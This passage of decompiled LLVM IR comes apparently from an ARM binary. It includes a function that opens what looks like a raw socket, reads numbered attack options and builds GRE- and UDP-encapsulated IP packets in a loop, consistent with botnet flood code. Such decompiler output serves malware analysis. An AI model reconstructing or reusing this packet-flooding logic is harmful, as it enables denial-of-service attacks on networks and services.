  %v3_a6ac = zext i8 %v2_a6ac to i32
  store i32 %v3_a6ac, i32* %r3.global-to-local, align 4
  store i32 %v5_a6a8, i32* %r2.global-to-local, align 4
  %v0_a6b4 = load i32, i32* @r4, align 4
  %v5_a6b4 = mul nuw nsw i32 %v3_a6ac, 4
  %v6_a6b4 = add i32 %v5_a6b4, %v5_a6a8
  %v7_a6b4 = inttoptr i32 %v6_a6b4 to i32*
  store i32 %v0_a6b4, i32* %v7_a6b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_a6bc = load i32, i32* @r7, align 4
  %v2_a6bc = add i32 %v1_a6bc, %v0_a6bc
  store i32 %v2_a6bc, i32* %r3.global-to-local, align 4
  %v1_a6c4 = trunc i32 %v2_a6bc to i8
  %v2_a6c4 = load i32, i32* @r5, align 4
  %v3_a6c4 = inttoptr i32 %v2_a6c4 to i8*
  store i8 %v1_a6c4, i8* %v3_a6c4, align 1
  %v0_a6c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6c8 = load i32, i32* @r6, align 4
  %v2_a6c8 = inttoptr i32 %v1_a6c8 to i32*
  store i32 %v0_a6c8, i32* %v2_a6c8, align 4
  %v2_a6cc = call i32 @function_13258(i32 %v1_a6bc, i32 8)
  %v2_a6d0 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a6d0 = zext i8 %v2_a6d0 to i32
  store i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6cc, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a6e0 = load i32, i32* @r7, align 4
  %v2_a6e0 = add i32 %v1_a6e0, %v3_a6d0
  store i32 %v2_a6e0, i32* %r1.global-to-local, align 4
  %v2_a6e4 = load i32, i32* @global_var_22378.55, align 4
  %v2_a6e8 = inttoptr i32 %v2_a6cc to i32*
  store i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32* %v2_a6e8, align 4
  %v3_a6ec = load i32, i32* @r4, align 4
  %v4_a6ec = add i32 %v3_a6ec, 4
  %v5_a6ec = inttoptr i32 %v4_a6ec to i8*
  store i8 6, i8* %v5_a6ec, align 1
  %v0_a6f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6f0 = mul i32 %v0_a6f0, 4
  store i32 %v3_a6f0, i32* %r1.global-to-local, align 4
  %v5_a6f4 = call i32 @function_14414(i32 %v2_a6e4, i32 %v3_a6f0, i32 ptrtoint (i32* @global_var_ae40.84 to i32), i32 6)
  %v2_a6f8 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a6f8 = zext i8 %v2_a6f8 to i32
  store i32 %v3_a6f8, i32* %r3.global-to-local, align 4
  store i32 %v5_a6f4, i32* %r2.global-to-local, align 4
  %v0_a700 = load i32, i32* @r4, align 4
  %v5_a700 = mul nuw nsw i32 %v3_a6f8, 4
  %v6_a700 = add i32 %v5_a700, %v5_a6f4
  %v7_a700 = inttoptr i32 %v6_a700 to i32*
  store i32 %v0_a700, i32* %v7_a700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a708 = load i32, i32* %r3.global-to-local, align 4
  %v1_a708 = load i32, i32* @r7, align 4
  %v2_a708 = add i32 %v1_a708, %v0_a708
  store i32 %v2_a708, i32* %r3.global-to-local, align 4
  %v1_a710 = trunc i32 %v2_a708 to i8
  %v2_a710 = load i32, i32* @r5, align 4
  %v3_a710 = inttoptr i32 %v2_a710 to i8*
  store i8 %v1_a710, i8* %v3_a710, align 1
  %v0_a714 = load i32, i32* %r2.global-to-local, align 4
  %v1_a714 = load i32, i32* @r6, align 4
  %v2_a714 = inttoptr i32 %v1_a714 to i32*
  store i32 %v0_a714, i32* %v2_a714, align 4
  %v2_a718 = call i32 @function_13258(i32 %v1_a708, i32 8)
  %v2_a71c = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a71c = zext i8 %v2_a71c to i32
  store i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a718, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a72c = load i32, i32* @r7, align 4
  %v2_a72c = add i32 %v1_a72c, %v3_a71c
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  %v2_a730 = load i32, i32* @global_var_22378.55, align 4
  %v2_a734 = inttoptr i32 %v2_a718 to i32*
  store i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32* %v2_a734, align 4
  %v3_a738 = load i32, i32* @r4, align 4
  %v4_a738 = add i32 %v3_a738, 4
  %v5_a738 = inttoptr i32 %v4_a738 to i8*
  store i8 7, i8* %v5_a738, align 1
  %v0_a73c = load i32, i32* %r1.global-to-local, align 4
  %v3_a73c = mul i32 %v0_a73c, 4
  store i32 %v3_a73c, i32* %r1.global-to-local, align 4
  %v5_a740 = call i32 @function_14414(i32 %v2_a730, i32 %v3_a73c, i32 ptrtoint (i32* @global_var_a7e4.86 to i32), i32 7)
  %v2_a744 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a744 = zext i8 %v2_a744 to i32
  store i32 %v3_a744, i32* %r3.global-to-local, align 4
  store i32 %v5_a740, i32* %r2.global-to-local, align 4
  %v0_a74c = load i32, i32* @r4, align 4
  %v5_a74c = mul nuw nsw i32 %v3_a744, 4
  %v6_a74c = add i32 %v5_a74c, %v5_a740
  %v7_a74c = inttoptr i32 %v6_a74c to i32*
  store i32 %v0_a74c, i32* %v7_a74c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* %r3.global-to-local, align 4
  %v1_a754 = load i32, i32* @r7, align 4
  %v2_a754 = add i32 %v1_a754, %v0_a754
  store i32 %v2_a754, i32* %r3.global-to-local, align 4
  %v1_a75c = trunc i32 %v2_a754 to i8
  %v2_a75c = load i32, i32* @r5, align 4
  %v3_a75c = inttoptr i32 %v2_a75c to i8*
  store i8 %v1_a75c, i8* %v3_a75c, align 1
  %v0_a760 = load i32, i32* %r2.global-to-local, align 4
  %v1_a760 = load i32, i32* @r6, align 4
  %v2_a760 = inttoptr i32 %v1_a760 to i32*
  store i32 %v0_a760, i32* %v2_a760, align 4
  %v2_a764 = call i32 @function_13258(i32 %v1_a754, i32 8)
  %v2_a768 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a768 = zext i8 %v2_a768 to i32
  store i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a764, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a778 = load i32, i32* @r7, align 4
  %v2_a778 = add i32 %v1_a778, %v3_a768
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v2_a77c = load i32, i32* @global_var_22378.55, align 4
  %v2_a780 = inttoptr i32 %v2_a764 to i32*
  store i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32* %v2_a780, align 4
  %v3_a784 = load i32, i32* @r4, align 4
  %v4_a784 = add i32 %v3_a784, 4
  %v5_a784 = inttoptr i32 %v4_a784 to i8*
  store i8 10, i8* %v5_a784, align 1
  %v0_a788 = load i32, i32* %r1.global-to-local, align 4
  %v3_a788 = mul i32 %v0_a788, 4
  store i32 %v3_a788, i32* %r1.global-to-local, align 4
  %v5_a78c = call i32 @function_14414(i32 %v2_a77c, i32 %v3_a788, i32 ptrtoint (i32* @global_var_81cc.88 to i32), i32 10)
  %v2_a790 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a790 = zext i8 %v2_a790 to i32
  store i32 %v3_a790, i32* %r3.global-to-local, align 4
  %v1_a794 = load i32, i32* @r6, align 4
  %v2_a794 = inttoptr i32 %v1_a794 to i32*
  store i32 %v5_a78c, i32* %v2_a794, align 4
  %v0_a798 = load i32, i32* @r4, align 4
  %v2_a798 = load i32, i32* %r3.global-to-local, align 4
  %v5_a798 = mul i32 %v2_a798, 4
  %v6_a798 = add i32 %v5_a798, %v5_a78c
  %v7_a798 = inttoptr i32 %v6_a798 to i32*
  store i32 %v0_a798, i32* %v7_a798, align 4
  %v0_a79c = load i32, i32* %r3.global-to-local, align 4
  %v1_a79c = load i32, i32* @r7, align 4
  %v2_a79c = add i32 %v1_a79c, %v0_a79c
  store i32 %v2_a79c, i32* %r2.global-to-local, align 4
  %v1_a7a4 = trunc i32 %v2_a79c to i8
  %v2_a7a4 = load i32, i32* @r5, align 4
  %v3_a7a4 = inttoptr i32 %v2_a7a4 to i8*
  store i8 %v1_a7a4, i8* %v3_a7a4, align 1
  ret i32 %v1_a79c

; uselistorder directives
  uselistorder i32 %v1_a79c, { 1, 0 }
  uselistorder i32 %v3_a788, { 1, 0 }
  uselistorder i32 %v1_a754, { 1, 0 }
  uselistorder i32 %v3_a73c, { 1, 0 }
  uselistorder i32 %v1_a708, { 1, 0 }
  uselistorder i32 %v3_a6f0, { 1, 0 }
  uselistorder i32 %v1_a6bc, { 1, 0 }
  uselistorder i32 %v3_a6a4, { 1, 0 }
  uselistorder i32 %v1_a670, { 1, 0 }
  uselistorder i32 %v3_a658, { 1, 0 }
  uselistorder i32 %v1_a624, { 1, 0 }
  uselistorder i32 %v3_a60c, { 1, 0 }
  uselistorder i32 %v1_a5d8, { 1, 0 }
  uselistorder i32 %v3_a5c0, { 1, 0 }
  uselistorder i32 %v1_a58c, { 1, 0 }
  uselistorder i32 %v3_a574, { 1, 0 }
  uselistorder i32 %v1_a540, { 1, 0 }
  uselistorder i32 %v3_a528, { 1, 0 }
  uselistorder i32 %v2_a504, { 1, 0 }
  uselistorder i32 %v5_a4e0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a4dc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22374.53 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_22375.70 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_22378.55, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
}

define i32 @function_a7e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a7e4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a7e4 = load i32, i32* @r4, align 4
  %v24_a7e4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_a800 = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_a804 = load i32, i32* @r5, align 4
  store i32 %v0_a804, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a814 = load i32, i32* @r4, align 4
  store i32 %v0_a814, i32* %r0.global-to-local, align 4
  %v5_a818 = inttoptr i32 %v0_a804 to i32*
  %v6_a818 = call i32 @function_a430(i32 %v0_a814, i32* %v5_a818, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a830 = load i32, i32* @r5, align 4
  store i32 %v0_a830, i32* %r1.global-to-local, align 4
  %v0_a834 = load i32, i32* @r4, align 4
  store i32 %v0_a834, i32* %r0.global-to-local, align 4
  %v5_a838 = trunc i32 %v6_a818 to i8
  %v6_a83c = inttoptr i32 %v0_a830 to i32*
  %v7_a83c = call i32 @function_a430(i32 %v0_a834, i32* %v6_a83c, i32 3, i32 65535)
  %v0_a840 = load i32, i32* @r5, align 4
  store i32 %v0_a840, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a83c, i32* %fp.global-to-local, align 4
  %v0_a850 = load i32, i32* @r4, align 4
  store i32 %v0_a850, i32* %r0.global-to-local, align 4
  %v4_a854 = inttoptr i32 %v0_a840 to i32*
  %v5_a854 = call i32 @function_a430(i32 %v0_a850, i32* %v4_a854, i32 4, i32 64)
  %v0_a860 = load i32, i32* @r5, align 4
  store i32 %v0_a860, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a86c = load i32, i32* @r4, align 4
  store i32 %v0_a86c, i32* %r0.global-to-local, align 4
  %v6_a874 = inttoptr i32 %v0_a860 to i32*
  %v7_a874 = call i32 @function_a430(i32 %v0_a86c, i32* %v6_a874, i32 5, i32 1)
  %v1_a880 = urem i32 %v7_a874, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a88c = load i32, i32* @r5, align 4
  store i32 %v0_a88c, i32* %r1.global-to-local, align 4
  %v0_a890 = load i32, i32* @r4, align 4
  store i32 %v0_a890, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a88c to i32*
  %v6_a898 = call i32 @function_a430(i32 %v0_a890, i32* %v5_a898, i32 6, i32 65535)
  %v0_a8a0 = load i32, i32* @r5, align 4
  store i32 %v0_a8a0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a898, i32* @r8, align 4
  %v0_a8b0 = load i32, i32* @r4, align 4
  store i32 %v0_a8b0, i32* %r0.global-to-local, align 4
  %v4_a8b4 = inttoptr i32 %v0_a8a0 to i32*
  %v5_a8b4 = call i32 @function_a430(i32 %v0_a8b0, i32* %v4_a8b4, i32 7, i32 65535)
  %v0_a8b8 = load i32, i32* @r5, align 4
  store i32 %v0_a8b8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a8b4, i32* @r7, align 4
  %v0_a8c8 = load i32, i32* @r4, align 4
  store i32 %v0_a8c8, i32* %r0.global-to-local, align 4
  %v4_a8cc = inttoptr i32 %v0_a8b8 to i32*
  %v5_a8cc = call i32 @function_a430(i32 %v0_a8c8, i32* %v4_a8cc, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a8dc = load i32, i32* @r5, align 4
  store i32 %v0_a8dc, i32* %r1.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r4, align 4
  store i32 %v0_a8e0, i32* %r0.global-to-local, align 4
  %v4_a8e4 = inttoptr i32 %v0_a8dc to i32*
  %v5_a8e4 = call i32 @function_a430(i32 %v0_a8e0, i32* %v4_a8e4, i32 1, i32 1)
  %v1_a8ec = urem i32 %v5_a8e4, 256
  %v0_a8f0 = load i32, i32* @r5, align 4
  store i32 %v0_a8f0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8fc = load i32, i32* @r4, align 4
  store i32 %v0_a8fc, i32* %r0.global-to-local, align 4
  %v5_a904 = inttoptr i32 %v0_a8f0 to i32*
  %v6_a904 = call i32 @function_a430(i32 %v0_a8fc, i32* %v5_a904, i32 19, i32 0)
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v2_a910 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_a910, i32* %r3.global-to-local, align 4
  store i32 %v6_a904, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v4_a920 = inttoptr i32 %v0_a90c to i32*
  %v5_a920 = call i32 @function_a430(i32 %v0_a91c, i32* %v4_a920, i32 25, i32 %v2_a910)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a934 = call i32 @function_14ba0(i32 2, i32 3, i32 6)
  store i32 %v3_a934, i32* @r0, align 4
  %v7_a938 = icmp eq i32 %v3_a934, -1
  store i1 %v7_a938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a938, label %dec_label_pc_ab98, label %dec_label_pc_a944

dec_label_pc_a944:                                ; preds = %dec_label_pc_a7e4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a94c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_a960 = call i32 @function_14b30(i32 %v3_a934, i32 0, i32 3, i32 %v6_a94c, i32 4)
  store i32 %v5_a960, i32* %r0.global-to-local, align 4
  %v7_a964 = icmp eq i32 %v5_a960, -1
  store i1 %v7_a964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a964, label %dec_label_pc_ab90, label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a944
  %v0_a96c = load i32, i32* @r8, align 4
  %v0_a970 = load i32, i32* @r7, align 4
  %v0_a974 = load i32, i32* %fp.global-to-local, align 4
  %v3_a974 = mul i32 %v0_a974, 65536
  store i32 %v3_a974, i32* %r3.global-to-local, align 4
  %v3_a97c = urem i32 %v0_a96c, 65536
  store i32 %v3_a97c, i32* %r2.global-to-local, align 4
  %v3_a980 = urem i32 %v0_a970, 65536
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v0_a984 = load i32, i32* @r6, align 4
  %v1_a984 = urem i32 %v0_a984, 256
  store i32 %v1_a984, i32* @r6, align 4
  %v0_a988 = load i32, i32* @sl, align 4
  %v2_a988 = icmp eq i32 %v0_a988, 0
  store i1 %v2_a988, i1* %cpsr_z.global-to-local, align 1
  %v3_a98c = urem i32 %v0_a974, 65536
  store i32 %v3_a98c, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a988, label %dec_label_pc_ae20, label %dec_label_pc_a9a4

dec_label_pc_a9a4:                                ; preds = %dec_label_pc_a96c
  %v3_a9ac = mul i32 %v5_a8cc, 65536
  %v1_a9b0 = add i32 %v3_a9ac, 524288
  %v1_a9b4 = add i32 %v3_a9ac, 4325376
  %v1_a9bc = add i32 %v3_a9ac, 1835008
  %v3_a9c0 = udiv i32 %v1_a9b4, 65536
  store i32 %v3_a9c0, i32* %r1.global-to-local, align 4
  %v3_a9c4 = udiv i32 %v1_a9bc, 65536
  store i32 %v3_a9c4, i32* %r3.global-to-local, align 4
  %v3_a9c8 = xor i32 %v3_a98c, 65535
  store i32 %v3_a9c8, i32* %r2.global-to-local, align 4
  %v3_a9cc = udiv i32 %v1_a9b0, 65536
  store i32 %v3_a9cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab2c = sext i8 %v5_a838 to i32
  %v2_ab50 = icmp eq i32 %v1_a880, 0
  %v2_aa9c = icmp eq i32 %v1_a984, 0
  %sext = mul i32 %v5_a854, 16777216
  %v4_ab4c = sdiv i32 %sext, 16777216
  br label %dec_label_pc_aaec

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_aaec, %dec_label_pc_ab70
  %v2_a9ec = phi i32 [ %v0_ab5c, %dec_label_pc_aaec ], [ %v2_a9ec.pre, %dec_label_pc_ab70 ]
  %v3_a9ec = add i32 %v2_a9ec, 9
  %v4_a9ec = inttoptr i32 %v3_a9ec to i8*
  store i8 47, i8* %v4_a9ec, align 1
  %v3_a9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a9f0, i32* %r2.global-to-local, align 4
  store i32 %v5_a920, i32* %r1.global-to-local, align 4
  %v3_a9f8 = mul i32 %v3_a9f0, 32
  store i32 %v3_a9f8, i32* %r3.global-to-local, align 4
  %v1_a9fc = load i32, i32* %r4.global-to-local, align 4
  %v2_a9fc = add i32 %v1_a9fc, 12
  %v3_a9fc = inttoptr i32 %v2_a9fc to i32*
  store i32 %v5_a920, i32* %v3_a9fc, align 4
  %v0_aa00 = load i32, i32* %r3.global-to-local, align 4
  %v1_aa00 = load i32, i32* %r2.global-to-local, align 4
  %tmp = mul i32 %v1_aa00, -8
  %v5_aa00 = add i32 %v0_aa00, %tmp
  %v1_aa04 = load i32, i32* @sb, align 4
  %v2_aa04 = add i32 %v1_aa04, %v5_aa00
  store i32 %v2_aa04, i32* %r3.global-to-local, align 4
  %v1_aa08 = add i32 %v2_aa04, 16
  %v2_aa08 = inttoptr i32 %v1_aa08 to i32*
  %v3_aa08 = load i32, i32* %v2_aa08, align 4
  store i32 %v3_aa08, i32* %r2.global-to-local, align 4
  store i32 25856, i32* %r0.global-to-local, align 4
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  store i32 %v3_aa08, i32* %v3_aa10, align 4
  %v0_aa14 = load i32, i32* %r0.global-to-local, align 4
  %v1_aa14 = add i32 %v0_aa14, 88
  store i32 %v1_aa14, i32* %r0.global-to-local, align 4
  %v1_aa18 = call i32 @function_14898(i32 %v1_aa14)
  %v2_aa18 = trunc i32 %v1_aa18 to i16
  %v3_aa1c = load i32, i32* @r8, align 4
  %v4_aa1c = add i32 %v3_aa1c, 2
  %v5_aa1c = inttoptr i32 %v4_aa1c to i16*
  store i16 %v2_aa18, i16* %v5_aa1c, align 2
  store i32 2048, i32* %r0.global-to-local, align 4
  %v1_aa24 = call i32 @function_14898(i32 2048)
  %v2_aa24 = trunc i32 %v1_aa24 to i8
  store i32 %v1_aa24, i32* %r0.global-to-local, align 4
  %v4_aa28 = udiv i32 %v1_aa24, 256
  store i32 %v4_aa28, i32* %r3.global-to-local, align 4
  %v1_aa2c = trunc i32 %v4_aa28 to i8
  %v2_aa2c = load i32, i32* @r7, align 4
  %v3_aa2c = add i32 %v2_aa2c, 13
  %v4_aa2c = inttoptr i32 %v3_aa2c to i8*
  store i8 %v1_aa2c, i8* %v4_aa2c, align 1
  %v3_aa30 = load i32, i32* @r7, align 4
  %v4_aa30 = add i32 %v3_aa30, 12
  %v5_aa30 = inttoptr i32 %v4_aa30 to i8*
  store i8 %v2_aa24, i8* %v5_aa30, align 1
  %v0_aa34 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa34 = add i32 %v0_aa34, 38
  %v2_aa34 = inttoptr i32 %v1_aa34 to i8*
  %v3_aa34 = load i8, i8* %v2_aa34, align 1
  %tmp59 = urem i8 %v3_aa34, 16
  %v1_aa38 = zext i8 %tmp59 to i32
  %v1_aa3c = or i32 %v1_aa38, 64
  store i32 %v1_aa3c, i32* %r3.global-to-local, align 4
  %v1_aa40 = trunc i32 %v1_aa3c to i8
  store i8 %v1_aa40, i8* %v2_aa34, align 1
  %v0_aa44 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa44 = add i32 %v0_aa44, 38
  %v2_aa44 = inttoptr i32 %v1_aa44 to i8*
  %v3_aa44 = load i8, i8* %v2_aa44, align 1
  %v1_aa48 = and i8 %v3_aa44, -16
  %v1_aa4c = or i8 %v1_aa48, 5
  store i8 %v1_aa4c, i8* %v2_aa44, align 1
  store i32 %v4_ab2c, i32* %r2.global-to-local, align 4
  %v2_aa58 = load i32, i32* @r5, align 4
  %v3_aa58 = add i32 %v2_aa58, 1
  %v4_aa58 = inttoptr i32 %v3_aa58 to i8*
  store i8 %v5_a838, i8* %v4_aa58, align 1
  store i32 %v3_a9c4, i32* %r0.global-to-local, align 4
  %v1_aa60 = call i32 @function_14898(i32 %v3_a9c4)
  %v2_aa60 = trunc i32 %v1_aa60 to i16
  %v3_aa64 = load i32, i32* @r5, align 4
  %v4_aa64 = add i32 %v3_aa64, 2
  %v5_aa64 = inttoptr i32 %v4_aa64 to i16*
  store i16 %v2_aa60, i16* %v5_aa64, align 2
  store i32 %v3_a9c8, i32* %r0.global-to-local, align 4
  %v1_aa6c = call i32 @function_14898(i32 %v3_a9c8)
  %v2_aa6c = trunc i32 %v1_aa6c to i16
  store i32 %v1_aa6c, i32* %r0.global-to-local, align 4
  store i32 %v4_ab4c, i32* %r1.global-to-local, align 4
  store i32 %v1_a880, i32* %r3.global-to-local, align 4
  store i1 %v2_ab50, i1* %cpsr_z.global-to-local, align 1
  %v3_aa7c = load i32, i32* @r5, align 4
  %v4_aa7c = add i32 %v3_aa7c, 4
  %v5_aa7c = inttoptr i32 %v4_aa7c to i16*
  store i16 %v2_aa6c, i16* %v5_aa7c, align 2
  %v0_aa80 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa80 = trunc i32 %v0_aa80 to i8
  %v2_aa80 = load i32, i32* @r5, align 4
  %v3_aa80 = add i32 %v2_aa80, 8
  %v4_aa80 = inttoptr i32 %v3_aa80 to i8*
  store i8 %v1_aa80, i8* %v4_aa80, align 1
  %v0_aa84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aa84, label %dec_label_pc_aa88, label %dec_label_pc_ab80

dec_label_pc_aa88:                                ; preds = %dec_label_pc_a9e8, %dec_label_pc_ab80
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_aa8c = load i32, i32* @r5, align 4
  %v3_aa8c = add i32 %v2_aa8c, 9
  %v4_aa8c = inttoptr i32 %v3_aa8c to i8*
  store i8 17, i8* %v4_aa8c, align 1
  %v0_aa90 = call i32 @function_f570()
  store i32 %v0_aa90, i32* %r0.global-to-local, align 4
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_aa9c, i1* %cpsr_z.global-to-local, align 1
  %v1_aaa0 = sub i32 1023, %v0_aa90
  store i32 %v1_aaa0, i32* %r3.global-to-local, align 4
  br i1 %v2_aa9c, label %.thread, label %.thread3

.thread:                                          ; preds = %dec_label_pc_aa88
  %v2_aaa8 = load i32, i32* @r5, align 4
  %v3_aaa8 = add i32 %v2_aaa8, 16
  %v4_aaa8 = inttoptr i32 %v3_aaa8 to i32*
  store i32 %v1_aaa0, i32* %v4_aaa8, align 4
  br label %bb

.thread3:                                         ; preds = %dec_label_pc_aa88
  %v1_aaa4 = load i32, i32* %r4.global-to-local, align 4
  %v2_aaa4 = add i32 %v1_aaa4, 16
  %v3_aaa4 = inttoptr i32 %v2_aaa4 to i32*
  %v4_aaa4 = load i32, i32* %v3_aaa4, align 4
  store i32 %v4_aaa4, i32* %r3.global-to-local, align 4
  %v2_aaac = load i32, i32* @r5, align 4
  %v3_aaac = add i32 %v2_aaac, 16
  %v4_aaac = inttoptr i32 %v3_aaac to i32*
  store i32 %v4_aaa4, i32* %v4_aaac, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread3
  %v1_aab0 = load i32, i32* @r5, align 4
  %v2_aab0 = add i32 %v1_aab0, 12
  %v3_aab0 = inttoptr i32 %v2_aab0 to i32*
  store i32 %v0_aa90, i32* %v3_aab0, align 4
  store i32 %v3_a97c, i32* %r0.global-to-local, align 4
  %v1_aab8 = call i32 @function_14898(i32 %v3_a97c)
  %v2_aab8 = trunc i32 %v1_aab8 to i16
  %v3_aabc = load i32, i32* @r6, align 4
  %v4_aabc = inttoptr i32 %v3_aabc to i16*
  store i16 %v2_aab8, i16* %v4_aabc, align 2
  store i32 %v3_a980, i32* %r0.global-to-local, align 4
  %v1_aac4 = call i32 @function_14898(i32 %v3_a980)
  %v2_aac4 = trunc i32 %v1_aac4 to i16
  %v3_aac8 = load i32, i32* @r6, align 4
  %v4_aac8 = add i32 %v3_aac8, 2
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v2_aac4, i16* %v5_aac8, align 2
  store i32 %v3_a9cc, i32* %r0.global-to-local, align 4
  %v1_aad0 = call i32 @function_14898(i32 %v3_a9cc)
  %v2_aad0 = trunc i32 %v1_aad0 to i16
  store i32 %v1_aad0, i32* %r0.global-to-local, align 4
  %v3_aad4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aad4, i32* %r3.global-to-local, align 4
  %v1_aad8 = add i32 %v3_aad4, 1
  store i32 %v1_aad8, i32* @r4, align 4
  %v1_aadc = load i32, i32* @sl, align 4
  %v9_aadc = icmp eq i32 %v1_aad8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  %v3_aae0 = load i32, i32* @r6, align 4
  %v4_aae0 = add i32 %v3_aae0, 4
  %v5_aae0 = inttoptr i32 %v4_aae0 to i16*
  store i16 %v2_aad0, i16* %v5_aae0, align 2
  %v0_aae4 = load i32, i32* @r4, align 4
